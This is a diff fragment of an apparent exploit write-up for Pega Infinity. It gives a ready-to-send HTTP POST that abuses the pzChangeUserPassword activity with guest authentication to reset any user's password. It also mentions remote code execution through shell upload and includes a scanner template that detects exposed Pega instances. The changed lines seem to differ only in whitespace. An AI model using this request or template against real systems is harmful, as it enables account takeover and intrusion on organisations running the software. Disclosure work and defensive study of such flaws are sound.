@@ -52,20 +52,20 @@ An attacker can bypass all stages of the password reset flow and reset any user'
   
 4. After allowing the initial request to go through, modify the HTTP requests body in the repeater so it includes the following data...  
 ```
-POST /prweb/PRServlet/app/default/:PEGA_ID*/!STANDARD HTTP/1.1 (:PEGA_ID is a unique ID for each site, it is in this format: ZOgwf2Zk3OsEg_oG74MXXxG2bXKbv56W)
+POST /prweb/PRServlet/app/default/:PEGA_ID*/!STANDARD HTTP/1.1 (:PEGA_ID is a unique ID for each site, it is in this format: ZOgwf2Zk3OsEg_oG74MXXxG2bXKbv56W)
 Host: redacted.com
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate
 Content-Type: application/x-www-form-urlencoded
-Content-Length: 112
+Content-Length: 112
 Origin: https://redacted.com
-DNT: 1
+DNT: 1
 Connection: close
 Referer: https://redacted.com/prweb/PRServlet/app/default/:PEGA_ID*/!STANDARD
 Cookie: yourCookie
-Upgrade-Insecure-Requests: 1
+Upgrade-Insecure-Requests: 1
 
 pzAuth=guest&NewPassword=Rules%401234&ConfPassword=Rules%401234&pyActivity%3DCode-Security.pzChangeUserPassword=
 ```  
@@ -89,20 +89,20 @@ Remote code execution via shell upload
 id: pega
 
 info:
-  name: Pega Infinity Login
-  author: sshell
-  severity: low
+  name: Pega Infinity Login
+  author: sshell
+  severity: low
 
 requests:
-  - method: GET
-    path:
-      - "{{BaseURL}}/prweb/PRRestService/unauthenticatedAPI/v1/docs"
-    headers:
-      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55
-    matchers:
-      - type: word
-        words:
-          - "Pega API"
+  - method: GET
+    path:
+      - "{{BaseURL}}/prweb/PRRestService/unauthenticatedAPI/v1/docs"
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55
+    matchers:
+      - type: word
+        words:
+          - "Pega API"
 ```  
   
 --->Exploit Video  
